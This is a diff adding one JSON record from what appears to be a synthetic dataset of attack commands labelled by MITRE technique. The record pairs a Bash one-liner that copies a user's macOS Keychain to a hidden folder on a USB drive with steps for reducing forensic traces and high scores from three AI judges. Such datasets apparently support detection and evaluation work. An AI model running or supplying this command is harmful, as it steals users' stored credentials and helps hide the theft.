@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "mkdir -p \"/Volumes/EXFIL/.k\" && cp -Rp \"$HOME/Library/Keychains\" \"/Volumes/EXFIL/.k/\"",
+  "explanation": "Copies macOS Keychain data to an external drive for offline extraction.",
+  "rationale_steps": [
+    "Locate keychain files under $HOME/Library/Keychains.",
+    "Use an existing USB volume at /Volumes/EXFIL as the physical egress path.",
+    "Copy recursively while preserving attributes to minimize forensic anomalies.",
+    "Avoid network channels entirely."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-c6269662",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and valid flags; mkdir -p and cp -Rp are correctly formed and chained with &&.",
+        "semantic_score": 5,
+        "semantic_justification": "Creates a hidden directory on a mounted external volume and recursively copies the user's Keychain directory to it, aligning with exfiltration over physical media without needing elevated privileges.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:14:11.989642Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags (-p for mkdir, -Rp for cp), proper use of && operator, and correct variable expansion with $HOME.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by creating a hidden directory (.k) on an external volume (/Volumes/EXFIL, a macOS mount point for removable media) and recursively copying macOS Keychain data there, which is a realistic and operationally plausible method for exfiltrating credentials via physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:38:29.679679Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard Bash syntax, correctly balances quotes, uses valid flags for mkdir and cp, and employs a logical operator correctly.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately targets the macOS Keychain path and uses a mounted external volume path consistent with the technique's description of exfiltration via physical media.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:38:31.214193Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
